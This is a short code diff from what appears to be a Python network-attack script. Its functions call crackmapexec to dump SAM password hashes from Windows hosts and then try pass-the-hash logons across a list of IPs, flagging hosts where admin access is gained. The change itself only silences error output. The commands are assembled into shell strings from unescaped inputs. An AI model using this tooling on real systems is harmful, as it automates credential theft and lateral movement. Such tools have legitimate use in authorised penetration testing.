@@ -41,7 +41,7 @@ def samGrab(ip, username, password):
 
     """
     command = 'crackmapexec --sam ' + ip + ' -u ' + username + ' -p ' + password + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '$6 ~ /^.*:::$/{print $6}'"""
-    return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')
+    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL).decode("utf-8").strip().split('\n')
 
 
 def osFingerprint(ipRange):
@@ -102,7 +102,7 @@ def attemptLogon(hashes, ips):
         for username, hash in hashes:
             command = 'crackmapexec ' + ip + ' -u ' + username + ' -H ' + hash + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '{if($6 ~ /^\[-\]$/) {print "Failed"} else if($6 ~ /^\[\+\]$/) {if($9 == "(Pwn3d!)") {print "Root"} else {print "Login"}}}'"""
             result = subprocess.check_output(command,
-                    shell=True).decode("utf-8").strip()
+                    shell=True, stderr=subprocess.DEVNULL).decode("utf-8").strip()
             if ip not in results:
                 results[ip] = []
             if result == "":
